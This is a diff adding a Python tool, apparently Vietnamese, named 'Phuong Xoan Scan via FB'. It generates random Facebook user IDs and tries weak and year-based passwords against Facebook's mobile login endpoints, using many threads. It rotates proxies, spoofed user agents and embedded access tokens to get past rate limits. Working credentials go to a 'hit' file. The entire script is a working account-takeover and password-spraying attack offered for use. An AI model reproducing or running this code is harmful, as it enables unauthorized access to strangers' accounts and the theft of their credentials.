@@ -1,0 +1,563 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import os
+import sys
+import time
+import uuid
+import random
+import requests
+import threading
+import urllib3
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from datetime import datetime
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+RED     = '\x1b[38;5;196m'
+GREEN   = '\x1b[38;5;46m'
+YELLOW  = '\x1b[38;5;220m'
+WHITE   = '\x1b[1;37m'
+CYAN    = '\x1b[38;5;51m'
+MAGENTA = '\x1b[38;5;201m'
+BLUE    = '\x1b[38;5;33m'
+RESET   = '\x1b[0m'
+
+TIMEOUT     = 8
+OUTPUT_HIT  = './phuongxoan_hit.txt'
+OUTPUT_CP   = './phuongxoan_cp.txt'
+OUTPUT_LOCK = './phuongxoan_locked.txt'
+TOKEN_FILE  = './tokens.txt'
+PROXY_FILE  = './proxies.txt'
+UID_FILE    = './uid.txt'
+
+WEAK_PASSWORDS = [
+    '123456', '1234567', '12345678', '123456789', '1234567890',
+    '123123', '111111', '222222', '333333', '000000',
+    'password', 'qwerty', 'abc123', '112233', '654321',
+    '123321', '11111111', '00000000', '99999999', '88888888',
+    '55555555', 'iloveyou', 'admin', 'letmein', 'welcome',
+    '1q2w3e4r', 'dragon', 'monkey', 'master', 'sunshine',
+]
+
+UA_LIST = [
+    "Mozilla/5.0 (Linux; Android 14; Pixel 7 Build/UQ1A.240205.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.164 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/450.0.0.44.109;]",
+    "Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.33.102;]",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 12; SM-A525F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/400.0.0.22.100;]",
+    "Mozilla/5.0 (Linux; Android 11; Redmi Note 10 Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.11.101;]",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:110.0) Gecko/20100101 Firefox/110.0",
+    "Mozilla/5.0 (Linux; Android 13; Pixel 6 Build/TQ3A.230805.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.22.100;]",
+]
+
+BUILTIN_TOKENS = [
+    "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+    "6628568379|c1e620fa708a1d5696fb990c466eaa64",
+    "124024574287414|bcb6d3a1d2e5e5e5e5e5e5e5e5e5e5",
+]
+
+# ── globals ──────────────────────────────────────────────────────────────────
+found_accounts = 0
+total_scanned  = 0
+rate_limited   = 0
+request_count  = 0
+
+pool_lock      = threading.Lock()
+scan_lock      = threading.Lock()
+req_lock       = threading.Lock()
+file_lock      = threading.Lock()
+tls_lock       = threading.Lock()
+stop_event     = threading.Event()
+local_state    = threading.local()
+
+token_pool     = []
+proxy_pool     = []
+verify_tls     = True
+
+# ── loaders ──────────────────────────────────────────────────────────────────
+def load_tokens():
+    global token_pool
+    loaded = BUILTIN_TOKENS[:]
+    used_builtin = True
+    if os.path.exists(TOKEN_FILE):
+        with open(TOKEN_FILE, 'r', encoding='utf-8') as f:
+            lines = [line.strip() for line in f if line.strip()]
+        if lines:
+            loaded = lines
+            used_builtin = False
+    with pool_lock:
+        token_pool = loaded
+        count = len(token_pool)
+    if not used_builtin:
+        print(f"{GREEN}[+] Loaded {count} tokens tu file{RESET}")
+    else:
+        print(f"{YELLOW}[!] Dung builtin tokens ({count}){RESET}")
+
+def load_proxies():
+    global proxy_pool
+    if os.path.exists(PROXY_FILE):
+        with open(PROXY_FILE, 'r', encoding='utf-8') as f:
+            lines = [line.strip() for line in f if line.strip()]
+        with pool_lock:
+            proxy_pool = lines
+            count = len(proxy_pool)
+        if count > 0:
+            print(f"{GREEN}[+] Loaded {count} proxies{RESET}")
+            return
+    with pool_lock:
+        proxy_pool = []
+    print(f"{YELLOW}[!] Khong co proxy file — chay direct{RESET}")
+
+# ── helpers ───────────────────────────────────────────────────────────────────
+def get_token():
+    with pool_lock:
+        if token_pool:
+            return random.choice(token_pool)
+        return BUILTIN_TOKENS[0]
+
+def get_proxy():
+    with pool_lock:
+        if not proxy_pool:
+            return None
+        p = random.choice(proxy_pool)
+    return {'http': p, 'https': p}
+
+def get_session():
+    sess = getattr(local_state, 'session', None)
+    if sess is None:
+        sess = requests.Session()
+        adapter = requests.adapters.HTTPAdapter(pool_connections=16, pool_maxsize=16, max_retries=0)
+        sess.mount('http://', adapter)
+        sess.mount('https://', adapter)
+        local_state.session = sess
+    return sess
+
+def get_headers():
+    return {
+        'User-Agent':              random.choice(UA_LIST),
+        'Accept':                  'application/json',
+        'Accept-Language':         'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'X-FB-Connection-Type':    'WIFI',
+        'X-FB-Net-HNI':            str(random.randint(40000, 50000)),
+        'X-FB-SIM-HNI':            str(random.randint(40000, 50000)),
+        'X-FB-Connection-Quality': 'EXCELLENT',
+        'X-FB-HTTP-Engine':        'Liger',
+        'Content-Type':            'application/x-www-form-urlencoded',
+    }
+
+def jitter(base=0.01, spread=0.02):
+    if base > 0 or spread > 0:
+        time.sleep(base + random.uniform(0, spread))
+
+def guess_year(uid):
+    uid = str(uid).strip()
+    prefixes = {
+        '100000': '2009-2010', '100001': '2010',
+        '100002': '2011',      '100003': '2011',
+        '100004': '2012',      '100005': '2013',
+        '100006': '2013',      '100007': '2014',
+        '100008': '2014',      '100009': '2015',
+        '6155':   '2023-2024', '6156':   '2024+',
+    }
+    for p, y in prefixes.items():
+        if uid.startswith(p):
+            return y
+    try:
+        n = int(uid)
+        if n < 1_000_000:       return '2004-2005'
+        if n < 50_000_000:      return '2006-2007'
+        if n < 1_000_000_000:   return '2008-2009'
+        return '2009+'
+    except ValueError:
+        return 'Unknown'
+
+def generate_uid(series=None):
+    r = random.choices
+    if series == '2009-2010':
+        sub = random.choice(['0', '1'])
+        return '10000' + sub + ''.join(r('0123456789', k=9))
+    if series == '2011-2012':
+        sub = random.choice(['2', '3', '4'])
+        return '10000' + sub + ''.join(r('0123456789', k=9))
+    if series == '2013-2014':
+        sub = random.choice(['5', '6', '7', '8'])
+        return '10000' + sub + ''.join(r('0123456789', k=9))
+    if series == '2015':
+        return '100009' + ''.join(r('0123456789', k=8))
+    if series == 'old':
+        return str(random.randint(1_000, 999_999_999))
+    sub = random.choice('123456789')
+    return '10000' + sub + ''.join(r('0123456789', k=9))
+
+def build_password_list(uid):
+    year = guess_year(uid)
+    ordered = []
+    seen = set()
+
+    def add_pwd(item):
+        if item and item not in seen:
+            seen.add(item)
+            ordered.append(item)
+
+    if year and year[0].isdigit():
+        y = year[:4]
+        for cand in (y, y[2:], y + '123', '123' + y):
+            add_pwd(cand)
+
+    for pwd in WEAK_PASSWORDS:
+        add_pwd(pwd)
+
+    return ordered
+
+# ── API calls ─────────────────────────────────────────────────────────────────
+def _post(url, data=None, params=None):
+    global request_count, rate_limited, verify_tls
+    with req_lock:
+        request_count += 1
+    with tls_lock:
+        current_verify = verify_tls
+
+    sess = get_session()
+    try:
+        if data is not None:
+            r = sess.post(
+                url,
+                data=data,
+                params=params,
+                headers=get_headers(),
+                proxies=get_proxy(),
+                timeout=TIMEOUT,
+                verify=current_verify,
+            )
+        else:
+            r = sess.get(
+                url,
+                params=params,
+                headers=get_headers(),
+                proxies=get_proxy(),
+                timeout=TIMEOUT,
+                verify=current_verify,
+            )
+
+        if r.status_code == 429:
+            with scan_lock:
+                rate_limited += 1
+            time.sleep(random.uniform(1.5, 3.0))
+            return {'error': 'rate_limited', 'status_code': 429}
+
+        try:
+            payload = r.json()
+        except ValueError:
+            return {
+                'error': 'non_json_response',
+                'status_code': r.status_code,
+                'raw_text': r.text[:300],
+            }
+
+        if isinstance(payload, dict):
+            payload.setdefault('_http_status', r.status_code)
+            return payload
+        return {'data': payload, '_http_status': r.status_code}
+    except requests.exceptions.SSLError as e:
+        if current_verify:
+            with tls_lock:
+                verify_tls = False
+        return {'error': 'ssl_error', 'detail': str(e)}
+    except requests.exceptions.RequestException as e:
+        return {'error': 'network_error', 'detail': str(e)}
+    except Exception as e:
+        return {'error': 'unexpected_error', 'detail': str(e)}
+
+def login_v1(uid, pwd, token):
+    return _post('https://b-graph.facebook.com/auth/login', data={
+        'adid':                        str(uuid.uuid4()),
+        'format':                      'json',
+        'device_id':                   str(uuid.uuid4()),
+        'cpl':                         'true',
+        'family_device_id':            str(uuid.uuid4()),
+        'credentials_type':            'device_based_login_password',
+        'error_detail_type':           'button_with_disabled',
+        'source':                      'device_based_login',
+        'email':                       uid,
+        'password':                    pwd,
+        'access_token':                token,
+        'generate_session_cookies':    '1',
+        'meta_inf_fbmeta':             '',
+        'advertiser_id':               str(uuid.uuid4()),
+        'currently_logged_in_userid':  '0',
+        'locale':                      'en_US',
+        'client_country_code':         'US',
+        'method':                      'auth.login',
+        'fb_api_req_friendly_name':    'authenticate',
+        'fb_api_caller_class':         'com.facebook.account.login.protocol.Fb4aAuthHandler',
+        'api_key':                     '882a8490361da98702bf97a021ddc14d',
+    })
+
+def login_v2(uid, pwd, token):
+    return _post('https://b-api.facebook.com/method/auth.login', params={
+        'format':                   'json',
+        'email':                    uid,
+        'password':                 pwd,
+        'credentials_type':        'device_based_login_password',
+        'generate_session_cookies': '1',
+        'error_detail_type':       'button_with_disabled',
+        'source':                  'device_based_login',
+        'meta_inf_fbmeta':         '',
+        'locale':                  'en_US',
+        'client_country_code':     'US',
+        'access_token':            token,
+        'fb_api_req_friendly_name':'authenticate',
+        'cpl':                     'true',
+    })
+
+def login_v3(uid, pwd, token):
+    """mobile graph endpoint fallback"""
+    return _post('https://graph.facebook.com/auth/login', data={
+        'email':        uid,
+        'password':     pwd,
+        'access_token': token,
+        'format':       'json',
+        'locale':       'en_US',
+    })
+
+METHODS = [login_v1, login_v2, login_v3]
+
+# ── result processor ──────────────────────────────────────────────────────────
+def classify(resp):
+    if not isinstance(resp, dict):
+        return 'MISS'
+
+    err = str(resp.get('error', '')).lower()
+    if err == 'rate_limited' or resp.get('status_code') == 429:
+        return 'RATELIMIT'
+    if err in ('network_error', 'ssl_error', 'non_json_response', 'unexpected_error'):
+        return 'NETERR'
+
+    if resp.get('session_key') and isinstance(resp.get('access_token'), str) and len(resp.get('access_token', '')) > 15:
+        return 'HIT'
+    if isinstance(resp.get('access_token'), str) and len(resp['access_token']) > 15 and not resp.get('error_msg') and not resp.get('error'):
+        return 'HIT'
+
+    err_data = resp.get('error_data') if isinstance(resp.get('error_data'), dict) else {}
+    err_obj = resp.get('error') if isinstance(resp.get('error'), dict) else {}
+    err_msg = ' '.join(
+        str(x) for x in (
+            resp.get('error_msg'),
+            err_data.get('url'),
+            err_obj.get('message'),
+            err_obj.get('error_user_msg'),
+        ) if x
+    ).lower()
+
+    err_code = str(resp.get('error_code') or err_obj.get('code') or '')
+    err_subcode = str(err_data.get('error_subcode') or err_obj.get('error_subcode') or '')
+
+    cp_url = str(err_data.get('url', '')).lower()
+    if err_subcode in ('1349174', '1349193', '1349196') or '/checkpoint' in cp_url or 'checkpoint/' in cp_url:
+        return 'CP'
+
+    if err_code in ('368', '405') or any(k in err_msg for k in ('account has been locked', 'account disabled', 'suspended')):
+        return 'LOCKED'
+
+    return 'MISS'
+
+def _append_line(path, line):
+    with file_lock:
+        with open(path, 'a', encoding='utf-8') as f:
+            f.write(line)
+
+def process(uid, pwd, resp):
+    global found_accounts
+    status = classify(resp)
+    year   = guess_year(uid)
+
+    if status == 'HIT':
+        with scan_lock:
+            found_accounts += 1
+        line = f"{uid}|{pwd}|{year}\n"
+        print(f"\n{GREEN}[HIT] {uid} | {pwd} | {year}{RESET}")
+        _append_line(OUTPUT_HIT, line)
+        return True
+
+    if status == 'CP':
+        line = f"{uid}|{pwd}|{year}\n"
+        print(f"\n{YELLOW}[CP]  {uid} | {pwd} | {year}{RESET}")
+        _append_line(OUTPUT_CP, line)
+        return False
+
+    if status == 'LOCKED':
+        _append_line(OUTPUT_LOCK, f"{uid}|{year}\n")
+        return False
+
+    return False
+
+# ── worker ────────────────────────────────────────────────────────────────────
+def worker(uid, method_idx=0):
+    global total_scanned
+    if stop_event.is_set():
+        return False
+
+    token     = get_token()
+    fn        = METHODS[method_idx % len(METHODS)]
+    fallback  = METHODS[(method_idx + 1) % len(METHODS)]
+    passwords = build_password_list(uid)
+    net_errs  = 0
+
+    for pwd in passwords:
+        if stop_event.is_set():
+            break
+        resp = fn(uid, pwd, token)
+        state = classify(resp)
+
+        if state == 'RATELIMIT':
+            token = get_token()
+            resp = fallback(uid, pwd, token)
+            state = classify(resp)
+
+        if state == 'NETERR':
+            net_errs += 1
+            if net_errs >= 3:
+                break
+            jitter(0.05, 0.08)
+            continue
+
+        net_errs = 0
+        if process(uid, pwd, resp):
+            with scan_lock:
+                total_scanned += 1
+            return True
+        jitter()
+
+    with scan_lock:
+        total_scanned += 1
+        scanned_now = total_scanned
+        hits_now    = found_accounts
+        rl_now      = rate_limited
+
+    with file_lock:
+        sys.stdout.write(
+            f"\r{WHITE}[*] Scan: {CYAN}{scanned_now}{WHITE} | "
+            f"Hit: {GREEN}{hits_now}{WHITE} | "
+            f"RateLimit: {RED}{rl_now}{RESET}   "
+        )
+        sys.stdout.flush()
+    return False
+
+# ── UI ────────────────────────────────────────────────────────────────────────
+def banner():
+    os.system('clear' if sys.platform != 'win32' else 'cls')
+    print(f"""{CYAN}
+    ╔══════════════════════════════════════════╗
+    ║     🌀  PHUONG XOAN - SCAN VIA FB     ║
+    ╚══════════════════════════════════════════╝
+    {RESET}""")
+
+def _read_int(prompt, default=None, minimum=1):
+    raw = input(prompt).strip()
+    if not raw and default is not None:
+        return default
+    val = int(raw)
+    if val < minimum:
+        raise ValueError(f"Value must be >= {minimum}")
+    return val
+
+def main_menu():
+    global stop_event, total_scanned, found_accounts, rate_limited, request_count
+
+    series_map = {
+        '1': '2009-2010', '2': '2011-2012',
+        '3': '2013-2014', '4': '2015',
+        '5': 'old',       '6': 'all',
+    }
+
+    while True:
+        banner()
+        print(f"""
+{YELLOW}[1]{RESET} Scan 2009-2010
+{YELLOW}[2]{RESET} Scan 2011-2012
+{YELLOW}[3]{RESET} Scan 2013-2014
+{YELLOW}[4]{RESET} Scan 2015
+{YELLOW}[5]{RESET} Scan ID Sieu Co (2004-2009)
+{YELLOW}[6]{RESET} Scan Random All
+{BLUE}[7]{RESET} Scan tu file UID (uid.txt)
+{YELLOW}[0]{RESET} Thoat
+""")
+        choice = input(f"{WHITE}[?] Chon chuc nang: {RESET}").strip()
+
+        if choice == '0':
+            print(f"{GREEN}[+] Ket qua luu tai {OUTPUT_HIT}{RESET}")
+            sys.exit(0)
+
+        uid_list = []
+        if choice == '7':
+            if not os.path.exists(UID_FILE):
+                print(f"{RED}[!] Khong tim thay uid.txt{RESET}")
+                time.sleep(1.5)
+                continue
+            with open(UID_FILE, 'r', encoding='utf-8') as f:
+                uid_list = [line.strip() for line in f if line.strip()]
+            print(f"{GREEN}[+] Loaded {len(uid_list)} UIDs tu file{RESET}")
+        elif choice in series_map:
+            try:
+                total = _read_int(f"{YELLOW}[?] So luong ID muon scan: {RESET}", minimum=1)
+            except ValueError:
+                print(f"{RED}[!] So luong ID khong hop le{RESET}")
+                time.sleep(1.2)
+                continue
+            uid_list = list({generate_uid(series_map[choice]) for _ in range(total)})
+        else:
+            print(f"{RED}[!] Lua chon khong hop le{RESET}")
+            time.sleep(1)
+            continue
+
+        try:
+            threads_n = _read_int(f"{YELLOW}[?] So thread (khuyen 20-50): {RESET}", default=30, minimum=1)
+        except ValueError:
+            print(f"{RED}[!] So thread khong hop le{RESET}")
+            time.sleep(1.2)
+            continue
+
+        method_idx = {'v1': 0, 'v2': 1, 'v3': 2}.get(
+            input(f"{YELLOW}[?] Method (v1/v2/v3, mac dinh v1): {RESET}").strip().lower(), 0
+        )
+
+        with scan_lock:
+            total_scanned = 0
+            found_accounts = 0
+            rate_limited = 0
+        with req_lock:
+            request_count = 0
+
+        stop_event = threading.Event()
+        print(f"\n{GREEN}[+] Bat dau scan {len(uid_list)} UIDs voi {threads_n} thread...{RESET}\n")
+        print(f"{YELLOW}[!] Nhan Ctrl+C de dung{RESET}\n")
+
+        start = datetime.now()
+        try:
+            with ThreadPoolExecutor(max_workers=threads_n) as ex:
+                futures = {ex.submit(worker, uid, method_idx): uid for uid in uid_list}
+                for fut in as_completed(futures):
+                    if stop_event.is_set():
+                        break
+                    fut.result()
+        except KeyboardInterrupt:
+            stop_event.set()
+            print(f"\n{RED}[!] Dung boi nguoi dung{RESET}")
+
+        elapsed = int((datetime.now() - start).total_seconds())
+        with scan_lock:
+            final_hits = found_accounts
+            final_scanned = total_scanned
+        print(f"\n\n{MAGENTA}[✓] Hoan thanh trong {elapsed}s | "
+              f"Hit: {final_hits} | Scan: {final_scanned}{RESET}")
+        input(f"{WHITE}[Enter] de tiep tuc...{RESET}")
+
+if __name__ == '__main__':
+    for out_path in (OUTPUT_HIT, OUTPUT_CP, OUTPUT_LOCK):
+        d = os.path.dirname(out_path)
+        if d and not os.path.exists(d):
+            os.makedirs(d, exist_ok=True)
+    load_tokens()
+    load_proxies()
+    main_menu()
